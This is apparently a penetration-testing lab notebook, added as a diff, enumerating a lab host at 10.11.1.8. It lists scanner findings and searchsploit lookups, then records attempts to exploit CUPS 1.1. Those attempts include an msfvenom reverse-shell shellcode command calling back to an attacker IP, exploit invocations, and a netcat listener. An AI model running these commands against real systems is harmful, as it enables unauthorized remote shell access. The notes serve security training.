@@ -1,0 +1,109 @@
+Attack Vectors & Searchsploit
+
+Attack Vectors / Searchsploit
+
+# FTP
+![bcf4f777d82124a6f6681598f968fe2e.png](../../../_resources/c38a5c85fe5b41828ed29a3d16327a13.png)
+
+# Robots.txt
+Disallows /internal and /tmp/
++ GET Entry '/internal/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+
+# http://10.11.1.8/internal
+Has a comment form. Source code uses javascript?
+![internal.png](../../../_resources/6788a70e2fe04d3d978f015c113b453e.png)
+[curl_internalDir.txt](../../../_resources/0eec02651e6a4c788d91363c816094e2.txt)
+![41270687309b23fb6904f4d978c518e7.png](../../../_resources/6fe1e9bd5210454d92127bda76781b6b.png)
+
+# HTTP Method TRACE on port 80
++ OSVDB-877: TRACE HTTP TRACE method is active, suggesting the host is vulnerable to XST
+![e86dd289f9a74cbe77e78847cc290e63.png](../../../_resources/f0558877879046f5a151ff928dc4227b.png)
+
+# Apache Byterange Filter DoS
+![14cd87d499350475a454433f8fc5999c.png](../../../_resources/1e30c24fa4934f1e885a971ef0de54b7.png)
+
+# Slowloris DOS attack
+![6c0b5e0a514955ebdf090e3431f9f475.png](../../../_resources/5e28db68b3434a58a32094111e694bd9.png)
+
+# SSL/TLS MITM vulnerability (CCS Injection)
+![ceeab58584de81c563b38181726f845d.png](../../../_resources/3a1e47526ba64ac7a1113fe706ed9a70.png)
+
+# Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)
+![ac86e230df29dee84ba189bbae987d2c.png](../../../_resources/cdca62c7c96645cdb642d96391aad6ba.png)
+
+# Diffie-Hellman Key Exchange Insufficient Group Strength
+![4dc32ae8266f6d39e7501e6b38df07a6.png](../../../_resources/d1801f6574e643449da07fe112827103.png)
+
+
+# SSL POODLE information leak 
+![61124822749b8f73259fc320c28d0e8a.png](../../../_resources/b94390776bd94988b04fcd117329ef73.png)
+
+
+# There is a cgi-bin folder 
+`http://10.11.1.8/cgi-bin/`
+
+# PHP/4.3.9
++ GET Retrieved x-powered-by header: PHP/4.3.9
+
+# Apache 2.0.52
++ HEAD Apache/2.0.52 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+`searchsploit apache 2.0.52`
+![2eeacab4abd8612c0fa28c194de0b2de.png](../../../_resources/b5df77453e7746b385e2206efdc3f66c.png)
+
+
+
+# TCN (Transparent Content Negotiation) Header
++ GET Uncommon header 'tcn' found, with contents: choice
+
+# HTTP method ('Allow Header')
++ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+
+
+# CUPS 1.1
+`searchsploit cups 1.1`
+![ed6b1d15f17bf2f421bd4aba78b4f03e.png](../../../_resources/1ba48839d3ab40f78be7015ef1bcd589.png)
+
+## Remote Command Execution
+### Searchsploit
+`searchsploit -m 41233`
+![85b1395bad7162be5388d90267cb6d65.png](../../../_resources/1dec8f3b6842402ebc073dd05fc1bf8b.png)
+
+Generated shellcode
+`msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.214 LPORT=5678 EXITFUNC=thread -f c --platform linux -o rev_linux_x86_shellReverseTcp_192.168.119.214_5678`
+![22d5f4dca9ebcdfea26b72ef07a53416.png](../../../_resources/8472602a6ef147409a2b9b915cc1b905.png)
+
+Usage:
+![574117dd62a21754fa65efc6c999d724.png](../../../_resources/57f29045e05545d8b9b3bcb993b35555.png)
+
+Run it - NO OUTPUT. LIKELY THE SHELL IS WRONG
+`python cups/41233.py -a 10.11.1.8 -b 631 -c rev_linux_x86_shellReverseTcp_192.168.119.214_5678`
+![571bb50a4e4263623407461b8638af83.png](../../../_resources/41ecec604fe64b25a7d773365bab6887.png)
+
+
+
+
+
+
+### Packet Storm Labs sigcup.c
+https://github.com/BuddhaLabs/PacketStorm-Exploits/tree/master/0301-exploits
+
+There are many warnings but it did compile
+![9837a0f6eb47c273202f1c81f7bdf405.png](../../../_resources/974ef6eb35a444cf8ec0788d491e5c17.png)
+
+Usage
+![35212845759556195a6ff948bcb38ee4.png](../../../_resources/199975c9b2ad444dbb39c6113931b77d.png)
+
+Created netcat listener
+![7e95a543d2f316b4e0208c23392ac58e.png](../../../_resources/21e3c3e911184b10b5cc3196a7bcdcc9.png)
+
+Run sigcups on target
+![7e76f373619b1f1d7e364b9c2a5973b7.png](../../../_resources/7b50ac0958e94292b867087c8dc79d15.png)
+
+
+
+
+
+
+# Port 3306
+SQL Injection mysql?
+
